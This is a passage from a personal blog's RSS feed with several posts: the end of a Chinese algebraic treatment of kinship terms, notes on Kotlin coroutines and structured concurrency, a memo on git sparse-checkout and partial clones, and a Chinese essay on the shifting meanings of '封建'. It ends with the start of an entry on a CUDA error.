$\Pi(z)$ 中长度最小者，其长度被称为 $z$ 的最小配偶分解长度，记为 $L(z)$</p><p  class="par"> $$L(z)=\min_{\pi \in \Pi(z)} |\pi|$$</p><p  class="par">。由于诸 $|\pi|$ 取值为正整数，他们的下确界 $L(z)$ 必存在，且也为正整数，因此这个定义是良好的。 <span style="float: right">$\blacksquare$</span></p><p >如果某个 $z$ 满足 $L(z)=1$，我们称其为一个<strong>标准因子</strong>。标准因子有着唯一的形式</p><p  class="nomargin"> <strong>定理 2 (标准因子的形式)</strong>&nbsp; $z \in \mathcal{Z}$，若 $L(z)=1$，则 $z$ 可以唯一地写成 $z=F^my$，其中 $n\geq 0$, $y \in \{B,S,E\}$。</p><p  class="nomargin"> <strong>证明</strong>&nbsp;<strong>(存在性)</strong>&nbsp; 由 $L(z)=1$ 知 $\exists (a_1,\ldots,a_n)\in \{F,E,B,S\}$，使得 $z=a_1\ldots a_n$。结合 $EF=BF=SF=F$ 的特性，我们可以不断将序列中的 $F$ 元与其左边的项合并，直至其左边为 $F$ 或其成为最左边的项为止。因此，我们可以不失一般性地假设存在 $1 \leq k \leq n$，使得</p><p  class="par"> $$\begin{aligned}  a_i&amp;=F, &amp;1\leq i \leq k; \\  a_j &amp;\in \{B,S,E\}, &amp;k &lt; j \leq n.\end{aligned}$$</p><p  class="par"> 其次，利用 $BB=SB=B,BS=SS=S$，可将 $a_{k+1}a_{k+2}\ldots a_{n}$ 进一步化简为单一元 $y \in \{S,B,E\}$。如此一来我们便构造出 $z$ 的一个符合条件的分解。</p><p  class="nomargin"> <strong>(唯一性)</strong> &nbsp; 假设存在 $m,n\geq 0$, $b,c\in\{B,S,E\}$ 使得 $z = F^mb = F^nc$。由辈分定理我们有 $m=n$，结合左消去律可得 $y=z$。故这样的分解是唯一的。<span style="float: right">$\blacksquare$</span></p><p >最后，我们有 $\mathcal{Z}$ 上的标准分解定理</p><p  class="nomargin"> <strong>定理 3 (标准分解)</strong>&nbsp; 对任意 $z \in \mathcal{Z}$，存在唯一的 $\pi_z \in \Pi(z)$，使得 $|\pi_z|=L(z)=n$，并且 $\pi_z$ 的第 $k$ 项为 $\pi_k=F^{p_k}a_k$，其中 $p_k \geq 0, a_k \in \{B,S,E\}$。换言之，$z$ 有如下唯一的标准分解</p><p  class="par"> $$z=F^{p_1}a_1WF^{p_2}a_2W\ldots W F^{p_n}a_n。$$</p><p  class="nomargin"> <strong>证明 (存在性)</strong>&nbsp; 由于 $\pi_z$ 已是 $z$ 长度最小的配偶分解，我们有</p><p  class="par"> $$L(\pi_1)=L(\pi_2)=\ldots=L(\pi_n)=1$$</p><p  class="par">，由定理 2 可知诸 $\pi_k$ 有着唯一的形式 $F^{p_k}a_k$，进而我们总能构造一个符合条件的标准分解。</p><p  class="nomargin"> <strong>证明 (唯一性)</strong>&nbsp; 若同时存在 $x$ 的两种不同分解</p><p  class="nomargin"> $$\begin{align}x &amp;= F^{p_1}a_1WF^{p_2}a_2W\ldots W F^{p_n}a_n \\  &amp;= F^{q_1}b_1WF^{q_2}b_2W\ldots W F^{q_n}b_n\end{align}$$</p><p  class="nomargin"> 利用左消去律我们可以消去两个序列开头的相同项，因此可以不失一般性地假设它们在开头便产生分歧。这会导致几种可能</p><ol><li>若 $p_1 = 0, q_1 &gt; 0$，由第一个序列，$x$ 形如 $a_1Wcx$，其中 $c \neq W, x \in W$；另一方面，由第二个序列，$z$ 形如 $Fy$，其中 $y \in W$。然而由性质 3 可知，这样的 $x, y$ 不存在。</li><li>$p_1 = p_2 = 0$，且 $a_1 \neq a_2$。则 $z$ 可以同时写为 $a_1Wcx$ 与 $b_1Wdy$，其中 $c \neq W,$ $d\neq W,$ $x,y \in \mathcal{Z}$。然而由性质 4 知，这样的 $x, y$ 不存在。</li></ol><p  class="nomargin"> 两种情况皆会导致矛盾。因此，我们有 $z$ 的分解是唯一的。 <span style="float: right">$\blacksquare$</span></p><h1 id="总结-1">总结</h1><p >本文使用群论的手段为中文语境下的亲属称谓建立了模型，提出了其若干性质，并最终证明了 $\mathcal{Z}$ 半群中元素的标准分解定理——这将成为我们拆解亲属称谓的有利工具。在下一篇博文中，我们将借此讨论两个亲属称谓可交换的充分必要条件。</p><div class="footnotes"><ol><li class="footnote" id="fn:1">前面说过，仅考虑家族树上的位置，不考虑可能的偶然。</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Group-Theory/">Group Theory</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Abstract-Algebra/">Abstract Algebra</category>
      
      
      <comments>https://i.hsfzxjy.site/commutable-family-names-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Some Notes on Kotlin Coroutines</title>
      <link>https://i.hsfzxjy.site/some-notes-on-kotlin-coroutines/</link>
      <guid>https://i.hsfzxjy.site/some-notes-on-kotlin-coroutines/</guid>
      <pubDate>Tue, 09 May 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;This post is written to dictate some opinionated explanation that dispels my confusion to Kotlin coroutines during learning.&lt;/p&gt;
&lt;h1 id=</description>
        
      
      
      
      <content:encoded><![CDATA[<p >This post is written to dictate some opinionated explanation that dispels my confusion to Kotlin coroutines during learning.</p><h1 id="suspend-keyword-colors-a-function"><code>suspend</code> keyword colors a function</h1><p >The <code>suspend</code> keyword in Kotlin <strong>colors</strong> a function, just like the <code>async</code> keyword in Javascript and Python, to inform the compiler that it might execute some asynchronous tasks.</p><p ><code>suspend</code>ing functions, such as the <code>delay()</code> function, must only be invoked within another <code>suspend</code>ing function.</p><div class="gk-unified-code row" data-gk-style="row"><div class="gk-code hljs" data-gk-id="kotlin_suspend" data-gk-title="Kotlin suspend"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  delay(<span class="hljs-number">1000</span>)</span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">bar</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// not allowed</span></span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="Python async"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():</span><br><span class="line">    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>():</span><br><span class="line">    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># not allowed</span></span><br></pre></div></div></div><h1 id="invocation-of-suspending-functions-are-sequential-by-default">Invocation of suspending functions are sequential by default</h1><p >If two suspending functions <code>fun1()</code> and <code>fun2()</code> are invoked one followed with another, their invocations are sequentialized, <em>i.e.</em>, only after <code>fun1()</code> finished will <code>fun2()</code> be started. This is in contrast with Javascript or Python, where <code>async</code>-functions must be explicitly <code>await</code>-ed to sequentialize.</p><div class="gk-unified-code row" data-gk-style="row"><div class="gk-code hljs" data-gk-id="kotlin_seq" data-gk-title="Kotlin"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fun1</span><span class="hljs-params">()</span></span> { delay(<span class="hljs-number">1000</span>) }</span><br><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fun2</span><span class="hljs-params">()</span></span> { delay(<span class="hljs-number">2000</span>) }</span><br><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  fun1()</span><br><span class="line">  fun2()</span><br><span class="line">  <span class="hljs-comment">// foo() finished in 3 seconds</span></span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK2" data-gk-title="Python"><div class="gk-code-display"><pre><span class="gk-section gk-include" data-gk-sid="BLOCK2.SEC1" data-gk-type="include"data-gk-referee="fun1_and_fun2"><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fun1</span>(): <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fun2</span>(): <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)</span><br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():</span><br><span class="line">    fun1()</span><br><span class="line">    fun2()</span><br><span class="line">    <span class="hljs-comment"># foo() returns immediately</span></span><br></pre></div></div></div><p  class="par"> In both of the preceding codes, <code>fun1()</code> and <code>fun2()</code> are invoked without additional syntax constructs. In Kotlin the invocations are sequential by default, and thus <code>foo()</code> will return in 3 seconds. In Python, the coroutines created are leaked without any execution, causing <code>foo()</code> to return immediately, and hopefully you will get a <code>RuntimeWarning: coroutine &#39;fun1&#39; was never awaited</code> as alert. To equalize them, the Python version should use explicit <code>await</code>:</p><div class="gk-unified-code row" data-gk-style="row"><div class="gk-code hljs" data-gk-id="kotlin_seq:1" data-gk-title="Kotlin"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fun1</span><span class="hljs-params">()</span></span> { delay(<span class="hljs-number">1000</span>) }</span><br><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fun2</span><span class="hljs-params">()</span></span> { delay(<span class="hljs-number">2000</span>) }</span><br><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br><span class="line">  fun1()</span><br><span class="line">  fun2()</span><br><span class="line">  <span class="hljs-comment">// foo() finished in 3 seconds</span></span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK3" data-gk-title="Python"><div class="gk-code-display"><pre><span class="gk-section gk-include" data-gk-sid="BLOCK3.SEC1" data-gk-type="include"data-gk-referee="fun1_and_fun2"><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fun1</span>(): <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)</span><br><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fun2</span>(): <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)</span><br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():</span><br><span class="gk-section gk-hl" data-gk-sid="BLOCK3.SEC2" data-gk-type="hl"><span class="line">    <span class="hljs-keyword">await</span> fun1()</span><br><span class="line">    <span class="hljs-keyword">await</span> fun2()</span><br></span><span class="line">    <span class="hljs-comment"># foo() returns in 3 seconds</span></span><br></pre></div></div></div><p  class="par"> Such difference between Kotlin and other languages prevents the case of developers forgetting to write <code>await</code> and leaking coroutines, which is a foundation of ergonomic structural concurrency.</p><h1 id="suspend-function-scope--coroutine-scope">suspend function scope != coroutine scope</h1><p >In Kotlin, coroutine builders such as <code>launch()</code> or <code>async()</code> must be invoked within a coroutine scope, since they are effectively extension methods of class <code>CoroutineScope</code>. However, a suspend function does not essentially form a coroutine scope, which means the following code is invalid:</p><div class="gk-code hljs" data-gk-id="kotlin_wrong_launch"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br><span class="gk-section gk-section" data-gk-sid="kotlin_wrong_launch.SEC1" data-gk-type="section"data-gk-desc="launch is not defined"data-gk-desc-show="true"><span class="line">  launch { delay(<span class="hljs-number">1000</span>) }</span><br></span><span class="line">}</span><br></pre></div></div><p  class="par"> Instead, one should wrap the function with a <code>coroutineScope</code> call to make use of the extensions:</p><div class="gk-unified-code diff"><div class="gk-code hljs" data-gk-id="DIFF1" data-gk-title="DIFF"><div class="gk-code-display"><pre><span class="gk-section gk-diff-del" data-gk-sid="DIFF1.SEC1" data-gk-type="diff-del"><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br></span><span class="gk-section gk-diff-add" data-gk-sid="DIFF1.SEC2" data-gk-type="diff-add"><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> = coroutineScope {</span><br></span><span class="line">  launch { delay(<span class="hljs-number">1000</span>) }</span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="kotlin_wrong_launch:1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {</span><br><span class="gk-section gk-section" data-gk-sid="kotlin_wrong_launch.SEC1:1" data-gk-type="section"data-gk-desc="launch is not defined"data-gk-desc-show="true"><span class="line">  launch { delay(<span class="hljs-number">1000</span>) }</span><br></span><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK4" data-gk-title="kotlin_correct_launch"><div class="gk-code-display"><pre><span class="gk-section gk-hl" data-gk-sid="BLOCK4.SEC1" data-gk-type="hl"><span class="line"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> = coroutineScope {</span><br></span><span class="line">  launch { delay(<span class="hljs-number">1000</span>) }</span><br><span class="line">}</span><br></pre></div></div></div><p  class="par"> Apart from <code>coroutineScope()</code>, other functions like <code>launch()</code>, <code>async()</code> or <code>runBlocking()</code> also create coroutine scopes.</p><h1 id="coroutine-scope-is-the-effective-way-to-structural-concurrency">Coroutine scope is the effective way to structural concurrency</h1><p ><strong>Coroutine scopes are hierarchical.</strong> When calling <code>.launch()</code> or <code>.async()</code> from a outer scope, a child scope is inherited and created from it, implicitly forming a tree-like invocation structure. </p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Unit</span> = runBlocking(CoroutineName(<span class="hljs-string">&quot;A&quot;</span>)) {</span><br><span class="line">  launch(CoroutineName(<span class="hljs-string">&quot;B&quot;</span>)) {</span><br><span class="line">    launch(CoroutineName(<span class="hljs-string">&quot;C&quot;</span>)) {</span><br><span class="line">      delay(<span class="hljs-number">1000</span>)</span><br><span class="line">      println(<span class="hljs-number">2</span>)</span><br><span class="line">    }</span><br><span class="line">    println(<span class="hljs-number">1</span>)</span><br><span class="line">  }.join()</span><br><span class="line">  launch(CoroutineName(<span class="hljs-string">&quot;D&quot;</span>)) { println(<span class="hljs-number">3</span>) }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> In the above program, we explictly attributes the name of different coroutines in order to refer them crystally. The program will create a conceptual hierarchy as below</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">A --&gt; B -&gt; C</span><br><span class="line">  \-&gt; D</span><br></pre></div></div><p  class="par"> Such hierarchy constrains the lifecycle of coroutines and therefore derives the structural concurrency. Specifically, we have –</p><p  class="nomargin"> <strong>Coroutine scopes are self-contained.</strong> A parental coroutine always waits for completion of all its children. Cancelling a parental coroutine recursively cancels all its children. The rules implies the program above would output like:</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line">1 (after one second)</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></div><p  class="par"> Since <code>launch(CoroutineName(&quot;B&quot;)) &#123;...&#125;.join()</code> would block until its child <code>coroutine-C</code> returns in one second. The self-containing property enables ergonomic cooperative job cancellation and ensures coroutines won’t be readily leaked <sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">However, they could be leaked if, for example, you insist to use <code>GlobalScope.launch</code>.</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Coroutine/">Coroutine</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Kotlin/">Kotlin</category>
      
      
      <comments>https://i.hsfzxjy.site/some-notes-on-kotlin-coroutines/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Git sparse-checkout and partial clones for Mega-Repos</title>
      <link>https://i.hsfzxjy.site/git-sparse-checkout-and-partial-clones-for-mega-repos/</link>
      <guid>https://i.hsfzxjy.site/git-sparse-checkout-and-partial-clones-for-mega-repos/</guid>
      <pubDate>Thu, 04 May 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Recently I was planning to make a small contribution to project &lt;a href=&quot;https://github.com/DefinitelyTyped/DefinitelyTyped&quot;&gt;DefinitelyT</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Recently I was planning to make a small contribution to project <a href="https://github.com/DefinitelyTyped/DefinitelyTyped">DefinitelyTyped/DefinitelyTyped</a>. It is a huge repository that hosts and provides the type declaration files for thousands of packages on <a href="https://npmjs.com/">npm</a>, with a structure like the following</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">types/</span><br><span class="line">├── 11ty__eleventy-img</span><br><span class="line">├── 1line-aa</span><br><span class="line">├── 3box</span><br><span class="line">├── ...and more of them...</span><br></pre></div></div><p  class="par"> Each sub-folder under the <code>types/</code> directory corresponds to a specific npm package.</p><p >The package I am interested in is <code>marked</code>, whose type declaration files reside in <code>types/marked/</code> directory. Towards this end, cloning the whole repository and doing a full checkout is considered worthless, since my disk space and network traffic would be eaten up by a bunch of irrelevant files.</p><p >Then I read several lines of instructions in the <a href="https://github.com/DefinitelyTyped/DefinitelyTyped#partial-clone">README</a> file, prompting that I could pair partial clone and sparse-checkout to achieve more efficient workflow. The instructions target a newer version of git 2.27, which doesn’t work for my environment with git 2.25. After some research I found the ones at <a href="https://github.blog/2020-01-17-bring-your-monorepo-down-to-size-with-sparse-checkout/">Bring your monorepo down to size with sparse-checkout | Github Blog</a> for my case. If you would apply the steps in this post, make sure to check the version of git on your hand.</p><p >To start with, we clone the forked repository with some additional arguments:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">$ git clone --filter=blob:none --depth=1 --no-checkout git@github.com:hsfzxjy/DefinitelyTyped</span><br></pre></div></div><p  class="par"> With <code>--filter=blob:none</code> option, files in the repo won’t be fetched until they are needed in the future. This would be helpful where the repo contains large amounts of files but those of interest only take up a small proportion. </p><p  class="nomargin"> The <code>--depth=1</code> option creates a shallow clone with the commit history truncated and accelerates the cloning process. If you execute <code>git log</code> afterwards, only a single commit would be displayed. </p><p  class="nomargin"> And finally, the <code>--no-checkout</code> option tells git to not checkout any files, leaving simply a <code>.git</code> directory in the working area.</p><p >Finished the cloning, we run a special command to initialize the configuration for git sparse-checkout:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">$ cd DefinitelyTyped/</span><br><span class="line">$ git sparse-checkout init --cone</span><br></pre></div></div><p  class="par"> The <code>--cone</code> option, as described <a href="https://github.blog/2020-01-17-bring-your-monorepo-down-to-size-with-sparse-checkout/#cone-mode-restricted-patterns-improve-performance">here</a>, enables the “Cone Mode” that brings improved performance during the checkout. After that, we use <code>git sparse-checkout set &lt;pattern&gt;</code> to take specific part of the repository into the working area:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">$ git sparse-checkout set types/marked</span><br></pre></div></div><p  class="par"> Now we should have the needed files ready under the root directory and the <code>types/marked/</code> directory, if you like a <code>tree</code> command to see:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">$ tree</span><br><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK5.SEC1" data-gk-type="zip"><span class="line">.</span><br><span class="line">├── azure-pipelines.yml</span><br><span class="line">├── dangerfile.ts</span><br><span class="line">├── LICENSE</span><br><span class="line">├── notNeededPackages.json</span><br><span class="line">├── package.json</span><br><span class="line">├── README.es.md</span><br><span class="line">├── README.it.md</span><br><span class="line">├── README.ja.md</span><br><span class="line">├── README.ko.md</span><br><span class="line">├── README.md</span><br><span class="line">├── README.pt.md</span><br><span class="line">├── README.ru.md</span><br><span class="line">├── README.zh-Hans.md</span><br><span class="line">└── types</span><br><span class="line">    └── marked</span><br><span class="line">        ├── index.d.mts</span><br><span class="line">        ├── index.d.ts</span><br><span class="line">        ├── marked-tests.ts</span><br><span class="line">        ├── OTHER_FILES.txt</span><br><span class="line">        ├── package.json</span><br><span class="line">        ├── tsconfig.json</span><br><span class="line">        ├── tslint.json</span><br><span class="line">        └── v3</span><br><span class="line">            ├── index.d.ts</span><br><span class="line">            ├── marked-tests.ts</span><br><span class="line">            ├── tsconfig.json</span><br><span class="line">            └── tslint.json</span><br></span><span class="line">3 directories, 24 files</span><br></pre></div></div><p  class="par"> From here on, the daily git operations such as commits and pushes would proceed as per usual.</p><h2 id="references-10">References</h2><ul><li><a href="https://github.blog/2020-01-17-bring-your-monorepo-down-to-size-with-sparse-checkout/">https://github.blog/2020-01-17-bring-your-monorepo-down-to-size-with-sparse-checkout/</a></li><li><a href="https://github.blog/2020-12-21-get-up-to-speed-with-partial-clone-and-shallow-clone/">https://github.blog/2020-12-21-get-up-to-speed-with-partial-clone-and-shallow-clone/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Git/">Git</category>
      
      
      <comments>https://i.hsfzxjy.site/git-sparse-checkout-and-partial-clones-for-mega-repos/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>辩义“封建”</title>
      <link>https://i.hsfzxjy.site/disambiguate-feudalism/</link>
      <guid>https://i.hsfzxjy.site/disambiguate-feudalism/</guid>
      <pubDate>Wed, 19 Apr 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;“封建”一词很有意思。作为一个土生土长的中国词，它于千年前便有了固定而确切的含义。然而在近代西方思潮的冲击下，这个词的意义先是遭到了替换，而后又在近百年的传播中演化成了与本义毫不相干的概念。如今的人们谈及封建一词时，心中不免会有困惑，因为其现代含义与汉字构成相去甚远。更糟</description>
        
      
      
      
      <content:encoded><![CDATA[<p >“封建”一词很有意思。作为一个土生土长的中国词，它于千年前便有了固定而确切的含义。然而在近代西方思潮的冲击下，这个词的意义先是遭到了替换，而后又在近百年的传播中演化成了与本义毫不相干的概念。如今的人们谈及封建一词时，心中不免会有困惑，因为其现代含义与汉字构成相去甚远。更糟糕的是，在一些语境下，这个词会回归至其近代甚至是古代的含义，从而对相关的交流造成混乱。同一词的释义在多种语境下不一致，无谓的争吵便在所难免。</p><p >粗略地说，“封建”至少有四种释义，即古代中国的封建制度、古代欧洲的 Feudalism、近现代中国与 Feudalism 的对译，以及当代民间语境中的封建。</p><p >“封建”最初的原始含义指一种政治制度，即中国古代的分封制。“封建”二字释为“封邦建国”，最早见于春秋时富辰之说的“周公吊二叔之不咸，固封建亲戚，以藩屏周。”在秦朝以前，天子会将自己直接管辖的王畿以外的土地，分封给诸侯，并授予他们爵位，诸侯再将土地进一步分封给卿大夫。受封者在自己的领地上有相当的自主权，并拥有军队，以协助其共主的统治。</p><p >这里有两点值得注意。一是最初的“封建”是一个中性词，仅描述一种政治制度，而这种制度脱胎于当时的生产力水平，纵使导致王室衰微，诸侯间争端频繁，也是先秦时代治理大范围疆土的有效之举。二是普遍认为自秦朝后，分封制便基本被以郡县制为核心的中央集权制度所取代。西汉初和西晋时虽也有封王，地方管理还是以郡县制为主。因此可以说，中国古代的封建制度只流行于先秦时期。</p><p >相对应地，英文中有个词叫“Feudalism”，中文也译为“封建”。这是一个庞大而繁杂的概念，没有一个明确而被广泛认可的定义。Feudalism 主要用于描述欧洲中世纪的法律、经济、军事、文化和政治习俗，但由于中世纪时间跨度大，欧洲势力众多，不同实体中封建的表观也会存在较大的差别。笼统而言，它指一种以土地占有制和人身关系为基础的关于权利和义务的社会制度。在这种制度中，封臣以领地的形式从领主手中获得土地。封臣要为领主尽一定的义务，并且必须向领主效忠。先秦中国的封建制度与欧洲的 Feudalism 相似，但也存在细节上的诸多不同。譬如周朝的分封制主要以血缘关系维系，受封者多为王室贵族和亲戚，只需定期上贡；而欧洲的封建主要依赖契约精神，有着雇佣性质，领主和附庸有着分明的义务和责任。严格来说，Feudalism 与先秦的封建制度不可划等号。</p><p >Feudalism 与封建一词的“联系”源自严复的错译。严复在 1901 年译《原富》以及 1903 年 6 月译《群己权界论》时，尚且将 Feudalism 译为“拂特”或“拂特之制”。但在 1903 年 11 月译《社会通诠》时，他开始采用“拂特封建”与 Feudalism 对译，或专称为“封建”。《社会通诠》中将社会的演化分为图腾社会（Totemistic society）、宗法社会（PaCriarchal or tribal society，族长制或部落社会）和国家三个阶段，其中拂特封建为宗法社会与国家的过渡阶段。但书中错误地只承认近代国家即军国社会为国家，将希腊城邦、古罗马等归为宗法社会之极致，这便导致与之相对地，中国有自先秦至清末长达两千多年的所谓封建阶段。</p><p >Feudalism 与封建的错误对译影响了近现代对中国历史阶段的划分和命名。这其中也有马克思主义史学家的部分作用。马克思主义的“五阶段论”认为，人类社会的演变会线性地经历原始社会、奴隶社会、封建社会和资本主义社会，并最终进入社会主义社会。如果机械地套用这一理论，中国从周朝到清朝的历史既不属于奴隶社会，也不属于资本主义社会，便只能属于封建社会了。</p><p >马克思主义史学家的封建社会以欧洲中世纪的 Feudalism 为背景，并更加强调那个阶段的生产关系，以地主或领主拥有土地并剥削农民或农奴为主要特征。这里“农奴”指欧洲庄园中的农奴，其身份附着于土地，不可任意离开庄园，介于自由人与奴隶之间。领主不仅占有生产资料，也垄断着法律和私人司法权。以这个定义，中国毫无疑问没有经历过所谓的封建社会，因为中原王朝历史上没有农奴这一概念。但从生产关系的角度看，从秦朝至清朝这段时期的中国社会与 Feudalism 有相似之处。秦朝后的中国虽是中央集权，却也因为土地兼并催生了地主阶级。在国家赋税沉重和土地兼并的作用下，大量农民往往沦为佃农，在事实上受到地主阶级的剥削。和农奴的境遇类似，佃农的劳动所产大部分归国家或地主所有，并与国家或地主建立较强的人身依附关系。</p><p >如此看来，五阶段论中的第三段从广义上勉强能对应中国秦至清末的历史，但“封建社会”一名显然是张冠李戴。即便如此，封建社会还是在很长一段时间里被作为那段历史阶段的称谓。新中国成立后，这一词连同五阶段论为我国一般历史教科书采用，成为我们当代人知悉封建社会这一概念的由来。但五阶段论实为斯大林误解马克思之意所书，马克思本人并未提出这一表述。斯大林在《论辩证唯物主义和历史唯物主义》中说</p><blockquote><p >随着社会生产力在历史上的变化和发展，人们的生产关系、人们的经济关系也相应地变化和发展。历史上有五种基本类型的生产关系：原始公社制的、奴隶占有制的、封建制的、资本主义的、社会主义的。</p></blockquote><p  class="par"> 这只是欧洲视角下的历史发展进程，并不是世界范围内普适的历史发展规律——像刚才所说，至少中国没有经历 Feudalism 意义下的封建制。因此近年来教科书取消了基于五阶段论的表述。</p><p >尽管学者们想纠正这一词义，然而经过几十年的传播，封建社会已成为习惯用法，以致“封建”一词在当代又演化出了新的义项。最初人们只是将帝制时期的政治概念冠以封建之名，如封建地主阶级。随后相关的思想文化也以封建形容，如以三纲五常、三从四德为代表的封建思想。由于旧时代的落后性，封建一词也逐渐转为贬义。乃至到了今天，封建的词义直接扩大化为与“保守”等同，出现了诸如“你怎么这么封建”等用法。和两千年前古籍中的词义相比，当代的词义已经面目全非了。</p><p >封建一词的演变，转折自近代学者的错误对译，最终导致不同语境下这一词有着毫不相干甚至截然相反的义项，实在让人啼笑皆非。历史的偶然也不过如此罢。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Sociology/">Sociology</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Etymology/">Etymology</category>
      
      
      <comments>https://i.hsfzxjy.site/disambiguate-feudalism/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Diving from the CUDA Error 804 into a bug of libnvidia-container</title>
      <link>https://i.hsfzxjy.site/diving-from-the-cuda-error-804-into-a-bug-of-libnvidia-container/</link>
      <guid>https://i.hsfzxjy.site/diving-from-the-cuda-error-804-into-a-bug-of-libnvidia-container/</guid>
      <pubDate>Sat, 18 Mar 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Several users reported to encounter &lt;code&gt;&amp;quot;Error 804: forward compatibility was attempted on non supported HW&amp;quot;&lt;/code&gt; during t</description>
        
      
      
      
